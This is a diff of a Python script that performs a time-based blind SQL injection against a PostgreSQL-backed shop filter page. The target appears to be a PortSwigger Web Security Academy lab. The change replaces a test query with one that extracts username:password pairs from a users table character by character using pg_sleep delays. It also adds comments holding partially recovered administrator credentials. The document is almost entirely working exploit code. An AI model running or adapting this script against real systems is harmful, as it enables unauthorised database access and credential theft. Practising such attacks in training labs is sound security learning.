@@ -8,8 +8,12 @@ import hashlib
 target = '' #put sqli vulnerable URL here
 
 #note: postgres
-query = "(SELECT+CASE+WHEN+(select ascii(substr((select+'ab'),[POS],1)))=[CHAR]+THEN+pg_sleep(3)+ELSE+'a'+END)"
-
+query = "(SELECT+CASE+WHEN+(select+ascii(substr((select+'ab'),[POS],1)))=[CHAR]+THEN+pg_sleep(3)+ELSE+'a'+END)"
+query = "(SELECT+CASE+WHEN+(select+ascii(substr((select+string_agg(username||':'||password,',')+from+users),[POS],1)))=[CHAR]+THEN+pg_sleep(3)+ELSE+'a'+END)"
+#adminis)rator:kgp2o259qr+gd3ls0kks,
+#r:kgp2o259qr'gd3ls0kks,
+#re
+#kgp2o259qregd3ls0kks
 
 def send(query):
     if "[POS]" not in query:
@@ -20,8 +24,8 @@ def send(query):
         sys.exit()
     burp0_url = "https://0a3500f1039b4861c04bcc8300ca00a6.web-security-academy.net:443/filter?category=Gifts"
     data = ''
-    for i in range(1,2000): #pos
-        for j in range(95,100): #char #32,127 #95,100
+    for i in range(24,2000): #pos #14,2000 #24
+        for j in range(32,127): #char #32,127 #95,100
             payload = "obviouslywrong'||%s||'" % query
             payload = payload.replace("[POS]",str(i))
             payload = payload.replace("[CHAR]",str(j))
@@ -30,7 +34,7 @@ def send(query):
             burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a7900e503ffbd76c33dce6300c80004.web-security-academy.net/filter?category=Gifts", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
             r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
             time = r.elapsed.total_seconds()
-            if int(time) > 1:
+            if int(time) > 2:
                 extractedchar = chr(j)
                 #print("[+] FOUND: %s" % extractedchar) #only for testing
                 sys.stdout.write(extractedchar)
